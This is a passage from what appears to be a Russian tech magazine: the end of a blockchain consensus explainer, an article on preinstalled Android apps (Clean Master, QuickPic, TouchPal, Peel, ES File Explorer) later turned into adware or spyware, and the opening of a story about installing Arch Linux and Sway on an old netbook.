проверяют: правилен ли хеш? Совпадает ли ссылка на предыдущий блок?
Валидны ли транзакции? Не потрачены ли монеты дважды? Если все сходит‐
ся, нода добавляет блок к своей копии цепочки и пересылает его дальше.
Через несколько секунд блок расходится по всей сети — как волна от камня,
брошенного в воду. А если данные не сходятся, нода молча выбрасывает этот
блок.





Здесь возникает неочевидная проблема. Что произойдет, если два майнера
в разных концах планеты независимо друг от друга создадут валидный блок
почти одновременно? Скажем, нода в Токио получит один корректный блок,
нода в Торонто — другой. Обе версии валидны, обе ссылаются на один и тот
же предыдущий блок. Получается, цепочка блокчейна раздваивается — воз‐
никает форк.
  В классической централизованной системе такую ситуацию разрешил бы
администратор: вот этот блок правильный, тот — нет. В блокчейне админис‐
тратора нет и решение принимается автоматически: сеть просто ждет. Рано
или поздно какой‑нибудь майнер соберет следующий блок и добавит его
поверх одной из двух конкурирующих веток, после чего эта ветка станет длин‐
нее. А протокол гласит: правильная цепочка — всегда самая длинная. Корот‐
кая ветка отмирает, ее транзакции возвращаются в пул неподтвержденных
и ждут включения в будущие блоки. Никто ничего не теряет, кроме невезучего
майнера, чей блок оказался в отмершей ветке, — его награда аннулируется.
На практике форки случаются регулярно — примерно раз‑два в неделю —
и разрешаются после появления одного‑двух новых блоков, то есть через
десять‑двадцать минут. Для блокчейна это рутина, а не коллизия.
   Обрати внимание, что произошло: десятки тысяч компьютеров, разбро‐
санных по всему миру, не связанных ничем, кроме интернет‑соединения,
не знающих друг о друге ничего, пришли к единому мнению о том, какие тран‐
закции произошли, а какие нет. Без голосования, без центрального органа,
без третейского суда. В теории распределенных систем эта задача называ‐
ется «задачей  византийских  генералов» —  как  нескольким  участникам
договориться о совместном действии, если среди них могут быть обманщики
или предатели?





Суть задачи такова: есть несколько генералов, которые должны решить —
атаковать или отступать. Если часть генералов получит одно сообщение,
а часть — другое, они могут действовать несогласованно и проиграть. Смысл
задачи состоит в том, чтобы найти способ, при котором все честные участни‐
ки придут к одному и тому же решению, даже если некоторые сообщения
ненадежны или недостоверны. Задачу сформулировали еще в 1982 году,
и долгое время считалось, что в полностью открытой сети, где участники ано‐
нимны и могут входить и выходить когда угодно, она не имеет практического
решения. Блокчейн не решает ее в классическом смысле, а предлагает
эффективный обходной механизм: согласие достигается через proof of work,
где попытка обмана становится слишком дорогой и потому экономически
невыгодной.


ВИДЫ БЛОКЧЕЙНОВ: ПУБЛИЧНЫЕ, ПРИВАТНЫЕ,
КОНСОРЦИУМНЫЕ

Все, о чем мы говорили до сих пор, — это биткоин. Открытая сеть, анонимные
участники, полная прозрачность, никакого контроля сверху. Но биткоин —
частный случай, за прошедшие после его появления годы люди успели понять
две вещи: во‑первых, сама идея неизменяемого распределенного реестра —
мощная, а во‑вторых, полная открытость подходит далеко не всем.
   Банку не нужно, чтобы транзакции его клиентов видел весь мир. Минздра‐
ву не нужно, чтобы медицинские карты пациентов лежали в открытом доступе
в сети, куда может заглянуть любой желающий. Консорциуму логистических
компаний не нужны анонимные майнеры — ему нужны пять проверенных пар‐
тнеров, которые подпишут контракт и будут валидировать блоки по очереди.
Из этих потребностей выросли три типа блокчейнов.
  Публичный блокчейн — это то, что мы разобрали выше. Биткоин,
Ethereum, Solana построены именно на этом принципе. Присоединиться
к такому блокчейну может кто угодно: скачал софт, запустил ноду — ты в сети.
Любой человек может читать все транзакции, отправлять свои, участвовать
в майнинге или валидации. Исходный код протокола открыт, правила меня‐
ются только по консенсусу большинства.
   Преимущества такой архитектуры очевидны: максимальная децентрализа‐
ция, устойчивость к цензуре, прозрачность. Недостатки — тоже. Публичные
блокчейны медленны: биткоин обрабатывает примерно семь транзакций
в секунду, Ethereum в лучшие дни — около тридцати. Для сравнения: платеж‐
ная система Visa без проблем обслуживает двадцать четыре тысячи. Плюс
абсолютная прозрачность — это палка о двух концах: полная история тран‐
закций видна всем желающим, и при должном старании можно деаноними‐
зировать владельцев отдельных кошельков, чем, собственно, с удовольстви‐
ем занимаются спецслужбы и всевозможные аналитические компании —
к огорчению тех, кто считал биткоин анонимным.
   Приватный блокчейн — это противоположный полюс. Такая сеть при‐
надлежит одной организации, и именно она решает, кто может к ней подклю‐
чаться, кто может читать данные и записывать транзакции. По сути, это обыч‐
ная корпоративная база данных, но с блокчейновой механикой: цепочка
хешей, неизменяемость записей, аудируемая история. Proof of work здесь
не нужен — все участники известны, доверие обеспечивается юридическим
договором, а не математикой.
   Зачем это вообще нужно, если можно взять какую‑нибудь PostgreSQL и не
городить огород? Ну, например, ради удобства аудита и защиты от внут‐
реннего мошенничества. В обычной базе данных администратор может тихо
подправить запись и, если логи тоже находятся под его контролем, никто
об этом не узнает. В приватном блокчейне каждая правка ломает цепочку
хешей. Даже свой собственный блокчейн подделать задним числом — задача
нетривиальная, если копии хранятся на нескольких независимых серверах
внутри компании.
   Критики справедливо замечают, что приватный блокчейн — это в зна‐
чительной степени маркетинговая обертка  вокруг давно известных  тех‐
нологий, те же Merkle-деревья и цепочки хешей существовали задолго
до Сатоси. Но обертка оказалась коммерчески успешной — и это тоже факт.
   Консорциумный блокчейн — это своеобразный компромисс между
первыми двумя архитектурами. Такая сеть управляется не одной организа‐
цией и не всем миром, а группой заранее определенных участников. Нап‐
ример, в подобный блокчейн могут входить двадцать фармацевтических кор‐
пораций, которые хотят отслеживать цепочку поставок лекарств от завода
до аптеки — но не желают выкладывать эти данные в открытый доступ и не
доверяют друг другу настолько, чтобы одна из них вела общую базу.
   Право на валидацию блоков в этом случае обычно распределяется между
участниками консорциума. Внешние игроки могут получить доступ на чте‐
ние — или не получить, это зависит от правил конкретной сети. Консенсус
обычно простой и быстрый — достаточно, чтобы две трети участников под‐
твердили блок. Не нужно тратить электричество на майнинг, не нужно ждать,
пока кто‑то найдет новый блок, транзакции проходят за секунды.
   Консорциумные блокчейны активно используются в банковской сфере:
это, например, Quorum (разработан JPMorgan на базе Ethereum, исполь‐
зовался для межбанковских расчетов), Energy Web Chain (консорциум энер‐
гетических компаний), IBM Food Trust (на базе Hyperledger, отслеживает дви‐
жение продуктов питания от фермы до полки — Walmart использует его
для  контроля  поставок  зелени  после  нескольких  вспышек  кишечных
инфекций).
   Если совсем упростить, разница между этими тремя типами блокчейна —
в ответе на один вопрос: кому разрешено участвовать в сети? Если всем —
этот блокчейн публичный. Одной организации — приватный. Клубу по приг‐
лашениям — консорциумный. Механика внутри — хеши, блоки, цепочка —
во всех случаях одна и та же, различается только политика доступа, а вместе
с ней — скорость, масштаб, степень децентрализации и уровень доверия,
который требуется от участников.
   Какой тип лучше — вопрос бессмысленный, это примерно как спрашивать,
что лучше: электричка, такси или собственный самолет. Зависит от того, куда
именно ты едешь и с какой целью.


ВЫВОДЫ

Вот, собственно, и весь блокчейн. Блоки с транзакциями, связанные хешами
в цепочку, которую слишком дорого подделывать. Копии цепочки, разбросан‐
ные по тысячам компьютеров, которые не доверяют друг другу, но умудряют‐
ся приходить к согласию. Три варианта политики доступа — от полной анар‐
хии до корпоративного клуба. И во всем этом нет ни одного принципиально
нового  изобретения:  хеш‑функции,  деревья  Меркла,  P2P-сети —  все
это существовало за годы и десятилетия до появления блокчейна. Гениаль‐
ность предложенной Сатоси технологии кроется в том, что все эти элементы
были в правильной пропорции собраны воедино.
  Я намеренно не упоминал в этой статье ни смарт‑контракты, ни NFT,
ни DeFi — каждая из этих тем заслуживает отдельного разговора, и мы к ним
еще вернемся. Сегодня задача была другая: показать фундамент, на котором
строится мировое здание криптовалют, ведь понимание инженерных прин‐
ципов их работы очень полезно вне зависимости от того, пользуешься ты
этой технологией или нет. © X
GEEK





«Видел?» — пишет мне коллега и присыла‐
ет   новость:   в   очередном   флагмане
Samsung  предустановленные приложения
отожрали 17 Гбайт дискового пространс‐                                                                                                 afonin
                                                                                      Эксперт по мобильнойтва — сразу после начальной настройки                                                                                    криминалистике компании
и без малейшей попытки спросить поль‐             «Элкомсофт»                                                                                               aoleg@voicecallcentral.com
зователя, надо ли оно ему.


Сегодня посмотрим, как производители смартфонов с Android создавали
проблемы своим пользователям, за мзду малую предустанавливая в сис‐
темный раздел всякий хлам. Предадимся ностальгии и вспомним ES File
Explorer, QuickPic, Clean Master и TouchPal — и посмотрим, во что прев‐
ратились эти некогда популярные утилиты.


ПРЕДУСТАНОВЛЕННЫЙ СОФТ И КАСТОМНЫЕ РАЗРЕШЕНИЯ

Для начала разберемся, как на самом деле работает трюк с предустановкой
и почему последующая подмена способна создать столько проблем.
   Обычные приложения, которые ты ставишь из Google Play, живут в песоч‐
нице — разделе /data/app — и используют стандартную модель разрешений
(уже давным‑давно приложения должны явно запрашивать доступ к камере,
контактам и прочему). Предустановленный же софт вшивается в системный
раздел, например в директории /system/app (а в некоторых случаях даже в /
system/priv-app ). Проблема здесь не в объеме — производители давно
научились вшивать «болванки» APK, которые практически не занимают места
в системном разделе. Фактически это набор из иконки, метаданных и (важ‐
но!) цифровой подписи разработчика.
   Такие предустановленные приложения нельзя удалить — их можно только
«заморозить» или «отключить» (функция disable); это удалит все накаченные
сверху обновления, но базовый APK из системного раздела никуда не про‐
падет: после сброса смартфона приложение вновь  окажется активным,
получит запрошенные права доступа, установит обновления и начнет делать
то, чего от него хотели разработчики.
  О каких правах доступа идет речь, если в Android система разрешений
давно гранулярная, а сам факт присутствия в системном разделе не гаран‐
тирует наследования «страшных» привилегий? О, у разработчиков богатей‐
шая фантазия! Предустановленные приложения (уточню: зловредные предус‐
тановленные приложения, чуть ниже мы посмотрим на некоторые из них)
прекрасно умеют игнорировать стандартные запросы разрешений, получая
их просто по факту своего присутствия в прошивке.
   OEM-производители (Samsung, Xiaomi и другие) часто выдают своему
софту    нестандартные,   кастомные    права.   Исследователи   нашли
более 4800 таких уникальных привилегий (PDF: An Analysis of Pre-installed
Android Software ), которых вообще нет в официальной документации Android
Open Source Project (AOSP). Они позволяют спокойно общаться с проп‐
риетарными компонентами, читать логи звонков и обходить ограничения
на расход батареи. Для сканеров Google Play эти разрешения фактически
невидимы.
   Наверное, если уважаемый производитель установил какое‑то приложе‐
ние, то, наверное, ему можно доверять... Сомневаешься? Правильно, но на
самом деле пока что все еще относительно нормально. Низкоуровневые раз‐
решения часто нужны для вполне банальных вещей — вроде обращения
к встроенному в телефон инфракрасному трансмиттеру для управления
телевизором, для чего в прошивках того времени просто не было стандар‐
тного API.
   Нехорошие вещи начали происходить не сразу, а очень даже потом.


ТРЮК С ПОДМЕНОЙ

Вернемся к началу предыдущего раздела. Предустановленный софт попада‐
ет на смартфон по такой цепочке: встроенный APK с цифровой подписью
разработчика → обновление через Google Play → наследование разрешений.
Видишь подвох? Цифровая подпись прошитого в системном разделе APK
не контролируется производителем смартфона; она — в руках разработчика
софта.
  А что, если  разработчик, накопив серьезную пользовательскую базу,
решит, что ему выгоднее выйти из бизнеса, срубив попутно немного много
денег? Или и вовсе продаст продукт какой‑нибудь медиаимперии? Практика
показала, что «если» тут неуместно; на самом деле речь идет о «когда».
В какой‑то момент разработчики неизбежно вступают на кривую дорожку;
деньги‑то не пахнут.
   Как пели в фильме «Остров сокровищ»:


      Раз‑два‑три‑четыре‑пять,
       Знаете наверно,«
      Раз‑два‑три‑четыре‑пять,
      Жадность — это скверно!
      Раз‑два‑три‑четыре‑пять,
      Скажем без подвоха,
      Раз‑два‑три‑четыре‑пять,
      Жадность — это плохо!                »
Главная дыра — цепочка механизма обновления. Как правило, OEM проверя‐
ет предустановленные приложения на безопасность только перед продажей
(на момент выхода устройства приложение белое и пушистое); случаи, когда
производитель вычищал уже предустановленный системный пакет из про‐
шивки просто из‑за рекламного спама, лично мне неизвестны ( кейс Triada —
это другое).
   Когда ты покупаешь телефон и подключаешь его к сети, Google Play авто‐
матически подгружает обновления для предустановленных программ: крип‐
тографическая подпись разработчика совпадает с заводской, все в порядке.
А вот обновленный APK, который скачивается в пользовательский раздел /
data/app, вендор уже не проверял, а Google Play сканировал только на пред‐
мет... а чего, собственно? Рекламные баннеры с точки зрения Google — вещь
вполне допустимая, а то, что изначально их не было, — вопрос не по адресу.
   Что мы имеем в итоге? Обновленный из магазина APK автоматически нас‐
ледует привилегии и кастомные права заводской версии, а разработчик
получает в свое полное распоряжение замечательный канал для заливки про‐
извольного (в том числе вредоносного) кода на миллионы устройств.


КЛИНЕРЫ И БУСТЕРЫ

Помнишь, когда‑то давно разнообразные клинеры, бустеры, оптимайзеры
и прочие улучшайзеры прочно прописывались в топе Google Play? Нельзя
сказать, что эти приложения совсем ничего не делали; они, в общем‑то, дей‐
ствительно и терли кеш, и убивали фоновые процессы. Проблема в том, что
эти действия не помогали достичь того, что обещали маркетологи.
   Когда утилита принудительно трет кеш или убивает фоновые процессы
(улыбаемся и машем смартфонам с китайскими прошивками без сервисов
Google), она заставляет систему выполнять сизифов труд. При следующем
открытии программы Android будет заново скачивать и декодировать то же
самое. Разные исследования показали, что такая «уборка мусора» повышает
фоновую нагрузку на CPU на треть и не экономит, а вовсе даже подъедает
заряд батареи в режиме ожидания.
   Несмотря на это, подобные приложения пользовались ажиотажным спро‐
сом,  и  их  предустановка  казалась  производителям  вполне  полезным
шагом — особенно если разработчик (до кейса Clean Master — считаные
минуты!) занес небольшую пачку зелени.
  А что сейчас? Поумнели ли пользователи? Или, может, Google проявила
порядочность и  выкинула из  магазина  этот мусор?  Нет,  пользователи
не поумнели, а Google не стала ни на йоту порядочнее: в маркете до сих пор
висят всякие Phone Cleaner и CCleaner, а также — как без этого! — разнооб‐
разные ИИ‑клинеры, каждый из которых имеет от 50 до 100 миллионов ска‐
чиваний.
   Народная вера в волшебную кнопку «сделать айфон из китайской подел‐
ки» неистребима, и монетизируется это все так же агрессивно.


CLEAN MASTER

Когда‑то китайская компания Cheetah Mobile, создатель утилиты Clean Master,
собравшей более миллиарда скачиваний, заключила крайне выгодные кон‐
тракты со многими вендорами. Кто‑то просто предустанавливал их софт,
а кто‑то пошел дальше. Технологии Clean Master были намертво интегри‐
рованы в проприетарное ПО Samsung — сначала в утилиту Smart Manager,
а затем в Device Care на флагманских устройствах Galaxy.
   Да, мы отлично знаем, что Samsung может делать хорошее железо, но с
софтом у них не очень , да и с безопасностью в те времена было так себе.
Неудивительно, что компания вляпалась и здесь, — впрочем, справедливости
ради, не она одна.
  В исследовательской компании Kochava обнаружили , что Cheetah Mobile
использовала системные права для масштабного абьюза Google Play Install
Referrer  API. В мобильной индустрии разработчики  платят реферальный
бонус (от 0,5 до 3 долларов) рекламной сети, которая привела пользователя
к  установке приложения. Обновленный Clean Master, постоянно работая
в фоновом режиме, мониторил состояние устройства и отслеживал момент,
когда пользователь начинал скачивать любое новое приложение. Прямо
перед завершением установки утилита инжектила фейковый синтетический
«клик», в результате чего API зачислял денежку рекламной сети Cheetah
Mobile.
   Схема проработала довольно долго; у Google и сторонних разработчиков
были украдены миллионы. Когда схема вскрылась, в Google удалили все при‐
ложения Cheetah Mobile из Play Store и отключили их от сети AdMob. Увы,
это не помогло тем пользователям, у которых их софт так и остался на смар‐
тфонах, а предустановленный код Cheetah еще долго продолжал работать
на миллионах старых устройств Samsung и Xiaomi.
  В этой схеме отметились Clean Master, Security Master, CM Launcher 3D,
Kika Keyboard, Battery Doctor, Cheetah Keyboard, CM Locker и CM File Manager.


QUICKPIC: КУПЛЮ ЮЗЕРОВ ОПТОМ, ДОРОГО

Допустим, чистильщики и оптимизаторы — продукты изначально «с душком»;
можно натянуть на глобус сову и сказать, что «за глупость надо платить». Слу‐
чай с QuickPic показывает, что влететь можно буквально на ровном месте.
   Изначально QuickPic был прекрасной и легковесной галереей для Android
без какой‑либо рекламы и лишнего мусора, в результате чего у приложения
образовалась огромная база пользователей. Именно на эту базу нацелилась
уже знакомая нам медиаимперия Cheetah Mobile. В 2015 году Cheetah Mobile
купила QuickPic за солидную сумму — около 7,6 миллиона долларов. Очевид‐
но, что им был нужен не алгоритм сортировки картинок, а уже установленный
канал связи с миллионами смартфонов.
   Сразу после поглощения Cheetah Mobile начала выкатывать обновления
через Google Play Store. Обновленная галерея внезапно стала требовать
новые, расширенные  права  доступа, не имеющие  никакого отношения
к просмотру фотографий. Среди новых функций галереи появились такие
полезные  (для  разработчика,  разумеется, не для  пользователя) вещи,
как постоянный фоновый  доступ  к местоположению и сбор подробной
информации об использовании устройства. Собранные данные приложение
начало молча сливать в Пекин.
   Впрочем, незаметно подглядывать за пользователями можно было бы
практически бесконечно, но разработчики этим не ограничились. После того
как в системе начали появляться неубиваемые фоновые процессы, генери‐
ровавшие навязчивую рекламу и выводившие оверлеи прямо на экран бло‐
кировки, последовала реакция сообщества. Энтузиасты начали активно архи‐
вировать и распространять старые версии (самая популярная из них —
v4.5.2), причем переподписывали ее другой цифровой подписью, чтобы отре‐
зать приложению возможность обновиться через Play Store.
   Жадность  сгубила  разработчиков. В конечном  итоге QuickPic попал
под массовую зачистку и был удален из магазина Google вместе с осталь‐
ными продуктами Cheetah Mobile в 2018 году.
   Конец  истории? Не  совсем. Ушлые спамеры  перехватили  название
и выпустили в Google Play подделку под названием Quickpic Gallery Photo &
Video (ссылку давать не буду, это мусор). Поддельное приложение набрало
более миллиона скачиваний, его рейтинг — 1.3; пользователи массово удив‐
ляются, почему их любимая галерея вдруг превратилась в... это. Типичный
крик души в комментариях звучит примерно так: «Пользовался больше десяти
лет! Купил новый смарт, поставил — а теперь не могу даже папку с фото
открыть, чтобы мне не прилетел баннер!» Наивные пользователи и не подоз‐
ревают, что льют воду на мельницу обычных сквоттеров, которые под шумок
умудрились продать пару тысяч платных версий.
  А что же оригинал? Его выбросили из Google Play, но галерея, как ни
странно, жива. Обратно в магазин ее не возьмут, но на GitHub есть обновлен‐
ный APK — увы, только 32-битный: исходников энтузиастам не завезли.


TOUCHPAL

Клавиатура — это то, чему ты доверяешь всю свою переписку, каждый крик
души, каждый смайлик — и все пароли. На минуточку, в iOS сторонние кла‐
виатуры есть (и ими уже давно можно пользоваться без особых неудобств),
но вот пароли, а также любая работа в безопасных приложениях вроде бан‐
ковских вызывают стандартную системную клавиатуру. Впрочем, не будем
осуждать разработчиков Android — наверняка у них были резоны предос‐
тавить такой уровень доверия случайным разработчикам, ведь не было
ни одного намека, что что‑то может пойти не так.
  А оно тем не менее пошло не так. Клавиатура TouchPal разрабатывалась
китайской компанией CooTek. В свое время разработчики заключили много
соглашений с разными производителями смартфонов. Эта клавиатура шла
«из коробки» на сотнях миллионов смартфонов от HTC, ZTE, Alcatel, Huawei
и многих бюджетных брендов (добавлю от себя, что лично боролся с ней
на одном из смартфонов HTC, что оказалось непростым делом: выпилить ее
с концами без рута было нельзя).
   Что же пошло не так? В 2019 году обнаружилось , что CooTek начала встра‐
ивать в обновления клавиатуры агрессивный рекламный модуль BeiTaAd.
А  чтобы сканеры Google  Play ничего не заподозрили, код был  жестко
обфусцирован. Вредоносная нагрузка пряталась внутри файлов с безобид‐
ными расширениями и была зашифрована алгоритмом AES. Система рас‐
паковывала и собирала код непосредственно в памяти устройства.
   Главная  техническая фишка, позволившая зловреду долго  оставаться
непойманным, — отложенный запуск. После обновления или установки кла‐
виатура вела себя совершенно безобидно в течение случайного интервала —
от 24 часов до двух недель. Когда у пользователя начинал твориться ад
на экране, он уже никак не мог связать это с обновлением какой‑то клавиату‐
ры.
   «Ад на экране» — это такая гипербола? Давай посмотрим: видеореклама
на весь экран в окне блокировки, да еще и громкая; всплывающий баннер,
перекрывающий интерфейс во время входящих звонков; баннеры ровно в тот
момент, когда ты нажимаешь на поле ввода...
  И подчеркну: клавиатура — это не бесполезный «улучшайзер», галерея
или фонарик. Это — приложение, имеющее разрешение на чтение всего вво‐
димого текста и отправку данных на китайские серверы (разумеется, за мир
во всем мире и для «улучшения облачного предиктивного ввода»).
   Более того, это системное приложение, под которым подписался про‐
изводитель смартфона. Предположить, что внутри сидит зашифрованный,
целенаправленно зловредный модуль, способный динамически подгружать
код из сети, могли только законченные параноики (ну или те, кто просто
не доверял свои пароли сторонним клавиатурам).
   Кончилось все как обычно. Летом 2019 года терпение Google лопнуло,
и из маркета за один день снесли все приложения CooTek (около 60 штук)
и забанили их в рекламной сети.


PEEL SMART REMOTE И СМЕРТЬ ИК-ПОРТОВ

Хочешь еще один кейс? Понимаю, банальные чистильщики и оптимизаторы
батареек уже порядком утомили; поищем что‑нибудь другое.
   Где‑то в годах с 2013-го по 2016-й флагманские смартфоны оснащались
инфракрасными портами. Samsung Galaxy S4, S5, S6, флагманы HTC и LG,
многие модели Xiaomi и десятки безымянных китайских девайсов умели
работать как универсальные пульты для телевизоров и прочей бытовой тех‐
ники. Согласись, круто: приходишь в гостиницу, пульт от кондиционера —
за деньги (нормальная практика в Китае в те времена), а ты — раз! — и реша‐
ешь вопрос?
  Но одного ИК‑порта мало, нужен софт, и Peel Smart Remote успешно
монополизировала эту нишу. Производители устанавливали миллионы копий
прямо в прошивки. Приложение было реально полезным: красивая телеп‐
рограмма, которая скачивалась через интернет, удобный пульт с нужными
настройками.
  А потом инфракрасные порты стали не нужны. Что послужило триггером —
вопрос спорный. Место в корпусе? Малый интерес со стороны пользовате‐
лей? Постепенный переход на стриминговые приставки и Android TV, которы‐
ми можно управлять прямо со смартфона без каких‑либо внешних портов?
Так или иначе, но с Galaxy S7 инфракрасные порты начали массово исчезать
из смартфонов.
  А что прикажешь делать ребятам из Peel, у которых из‑под ног стремитель‐
но уходила земля? И тут они вспомнили: постойте, так у нас же сотни мил‐
лионов  пользователей  с  неудаляемым  приложением!  Помирать,  так
с музыкой! (Справка: на языке инвесторов это называется «оптимальная
стратегия выхода». Не перепутай.)
   Дальше ты наверняка догадался. Обновление, малварь, заместившая
экран блокировки на нечто, имитирующее «оптимизатор зарядки», которая
перехватывала управление при подключении кабеля и запускала прокрутку
полноэкранной рекламы.
   Пустившиеся во все тяжкие разработчики на этом не остановились. В ход
пошли постоянные всплывающие баннеры поверх других окон (спасибо раз‐
решению SYSTEM_ALERT_WINDOW, которое у системных приложений было
активно по умолчанию). Приложение начало агрессивно собирать историю
того, что смотрит пользователь по ТВ (если умный телевизор имел неос‐
торожность находиться в той же сети Wi-Fi), и продавать эти профили рек‐
ламным медиаторам для таргетинга.
   Итог предсказуем: Peel был с позором изгнан из Google Play, но кровушки
из пользователей старых флагманов успел попить изрядно. Полагаю, что и на
комфортную пенсию основателям этих данных и показов с лихвой хватило.


ES FILE EXPLORER

Если оптимайзерами и улучшайзерами я не пользовался никогда, то ES File
Explorer долгое время был моим любимым файловым менеджером. И не толь‐
ко моим. В эпоху Android 2.x–4.x это был абсолютный мастхев, эдакий швей‐
царский нож, который ставился на новый смартфон в первую очередь. Под‐
держка FTP, локальных SMB-шар и десятка облачных дисков, встроенный
архиватор, а главное — полноценный доступ к корню файловой системы — он
умел все.
  А потом было как обычно. Права на приложение перешли к китайской ком‐
пании DO Global (основана выходцами из корпорации Baidu), и идеальный
инструмент начал стремительно обрастать мусором.
   Сначала в менеджере появился «волшебный» экран быстрой зарядки.
Не новость, полноэкранная реклама в окне блокировки — классика жанра,
буквально  только что видели в TouchPal. Файловый менеджер, который
показывает рекламу на экране блокировки... ладно, пока потерпим. Терпели,
терпели — и дотерпелись: в начале 2019 года Батист Робер (известный
в Twitter под ником Elliot Alderson) решил поковыряться во внутренностях при‐
ложения и обнаружил уязвимость CVE-2019-6447. Оказалось, что при каждом
запуске ES File Explorer поднимал на смартфоне скрытый локальный HTTP-
сервер на порте 59777.
   Проблема в том, что этот сервер не требовал вообще никакой авториза‐
ции и принимал запросы от кого угодно, если он находился в той же сети Wi-
Fi. ES File Explorer отдавал все, к чему у него был доступ: позволял просматри‐
вать структуру директорий, выкачивать фотографии из галереи, читать файлы
с SD-карты и даже удаленно запускать приложения на твоем устройстве.
   Финал... да все то же самое. Весной 2019 года в Google провели мас‐
штабное  расследование,  поймали DO  Global на  клик‑фроде  (скрытые
фоновые процессы кликали по невидимым рекламным баннерам) и одним
махом вычистили из маркета всю их экосистему. ES  File Explorer исчез
из Google Play. Впрочем, если тебя мучает ностальгия, то свежий APK до сих
пор можно скачать с официального сайта EStrongs.


МОРАЛЬ

И что, я таки должен писать «жадность — это плохо»? Вот — написал. Полег‐
чало. А Samsung тем временем спокойно кладет в карман очередной чек
за   предустановку   очередной   пачки   приложений.   Пожалуй...  будь
как Samsung? © X
GEEK





Когда у тебя есть старый ноутбук и немного
свободного  времени,  можно   провести
сеанс некромантии: подобрать оптималь‐
ную ОС и подходящий набор софта, чтобы                                                                                   stend003
                                                                                         stend003@yandex.ruтвоя машина смогла тянуть современные
задачи. Этим мы сегодня и займемся.


У меня долгое время пылился на полке нетбук Samsung NC110. Просто оцени
масштаб трагедии:
 • Процессор: Intel Atom N455
 • Ядра/потоки: одно ядро / два потока (с Hyper-Threading)
 • Тактовая частота: 1,66 ГГц
 • Кеш: 512 Кбайт L2
 • Поддержка памяти: DDR2/DDR3 (2 Гбайт)
 • Графика: Intel GMA 3150
 • Энергопотребление (TDP): 7 Вт
 • Дата выпуска: июнь 2010 года (16 лет)





В стоке на нем стояла Windows 7 Starter, и какое‑то время отец пользовался
им для серфинга и просмотра фоток с цифровой «мыльницы». Это были слав‐
ные времена, когда связка Windows 7 и браузеров еще как‑то шевелилась.
Но время шло, «семерка» стала неюзабельной, а Firefox перестал нормально
открывать половину сайтов. На какое‑то время жизнь старичку продлил Linux
Mint Qiana, но в один прекрасный момент при попытке обновиться посыпа‐
лись ошибки 404 — поддержка релиза закончилась.
   Нетбук отправился на полку. Но я физически не могу спокойно смотреть
на рабочее, но бездействующее железо. Появилась цель: реанимировать
девайс до состояния «можно серфить в вебе и кодить, а еще писать тексты».
   Поначалу я думал, что сильно ограничен в выборе дистрибутива, так
как большинство мейнстримных проектов давно выкинули поддержку 32-бит‐
ных процессоров. Но, покурив мануалы, я с удивлением обнаружил, что мой
Atom N455 поддерживает 64-битные инструкции! Это в корне меняло дело.
Ради эксперимента я накатил Ubuntu 12.04 (Precise Pangolin). Система встала,
оборудование определилось, но ни репозитории, ни современные браузеры,
естественно, не завелись. Как печатная машинка с ограниченным доступом
во внешний мир — сойдет, но меня это не устраивало.
   Спустя какое‑то время я созрел для Arch Linux. Экспериментировать с ним
на основной рабочей машине не хотелось, поэтому Samsung NC110 был тор‐
жественно назначен главным подопытным. Я вооружился мануалами с Arch
Wiki, запустил ноутбук с Live CD и погрузился в консоль.


ГЛАВА ПЕРВАЯ, ГДЕ Я РАЗМЕЧАЮ ДИСК И ИЩУ ФАНТОМНЫЙ
UEFI

Мой нетбук настолько старый, что его BIOS даже не подозревает о существо‐
вании UEFI. Там, где у нормальных людей есть переключатель Legacy/UEFI,
у меня только суровый, безальтернативный Legacy. При этом сам жесткий
диск имел загрузочную область, размеченную в GPT, — видимо, эхо прошлых
попыток накатить современные дистрибутивы.





Сама разметка прошла гладко, раздел EFI я трогать не стал (за неимением
оного). В процессе установки загрузчика я собрал два классических нубских
фейла исключительно по невнимательности. Сначала забыл сгенерировать
конфиг GRUB ( grub-mkconfig ), из‑за чего остался без загрузочного меню.
А во второй раз по привычке попытался поставить GRUB для UEFI, который,
как мы помним, ноутом вообще не поддерживается.
   Поправив эти мелочи, я наконец‑то загрузился в командную оболочку све‐
жеустановленного Arch Linux. Дальше начиналось самое интересное.


ГЛАВА ВТОРАЯ. ВЫБИРАЮ ОКОННЫЙ МЕНЕДЖЕР И ЗАКРЫВАЮ
ГЕШТАЛЬТЫ

В качестве графического окружения я решил ставить Sway. Заодно хотелось
закрыть старый гештальт: когда‑то я сидел на i3wm, начал миграцию на Sway,
но бросил на полпути. Так что я решил посмотреть, к чему привело развитие
этого Wayland-композитора. К тому же я достаточно хорошо знаком с его
логикой и конфигурацией. Это должно было сэкономить мне кучу времени
на чтение доков и уберечь от граблей, щедро разбросанных в незнакомых
тайловых менеджерах.
  Но до иксов (то есть до Wayland’а) я прошелся по стандартному чек‑листу:
настройка локали, времени, поднятие Wi-Fi и базовые вещи вроде создания
пользователя.


ГЛАВА ТРЕТЬЯ, ГДЕ Я ВЫПАДАЮ ИЗ РЕАЛЬНОСТИ И ИЩУ
БРАУЗЕР

Sway без проблем установился из официального репозитория. Запустив
«голый» менеджер, я увидел лишь девственно чистый черный экран. Доус‐
тановил рекомендуемый минимум: Waybar и пару важных утилит.
  И тут я задал себе резонный вопрос: а ради чего, собственно, вся эта нек‐
романтия? Как я собираюсь использовать этот артефакт ушедшей эпохи?
Ответ нашелся быстро: по прямому назначению — читать статьи и смотреть
мемы. А значит, нужен браузер.
  Мои прошлые изыскания на слабом железе обычно приводили либо
к Firefox (который мгновенно сжирал всю оперативку), либо к консольным
браузерам вроде Lynx (настолько аскетичным, что сам Будда бы заплакал).
Немного погуглив, я откопал настоящее сокровище — qutebrowser.





                              Qutebrowser

Это легкий современный браузер на базе QtWebEngine, ориентированный
на управление горячими клавишами в стиле vi . Он просто создан для тай‐
ловых оконных менеджеров и старого железа. Qutebrowser покорил меня
с первых секунд использования. Бинго! Котиков смотреть можно, 99% задачи
решено.


ГЛАВА ЧЕТВЕРТАЯ. ЛОВУШКА КАСТОМИЗАЦИИ (RICING) И ВОЙНА
С BROADCOM

Было время, я частенько залипал в пабликах по тегу #unixporn, где гики вык‐
ладывают скриншоты своих вылизанных рабочих столов. Глаз радовался,
но самому заниматься «райсингом» не хотелось: я годами сидел с дефолтной
темой, обычным Bash, а обои не менял так долго, что они начинали откле‐
иваться по углам.
  И вот я обнаруживаю, что уже четвертый час ковыряю конфигурационные
файлы панели задач Waybar. Тут нужен оттенок чуть потемнее, там шрифт
на пиксел меньше, здесь отступы не гармонируют, а углы скругления слишком
велики. Я понял, как работает эта магия, и с ужасом осознал, что в этом сос‐
тоянии можно провести еще пару суток. Не ровен час, обнаружу себя глу‐
боким стариком, который все еще правит CSS-файл панели.





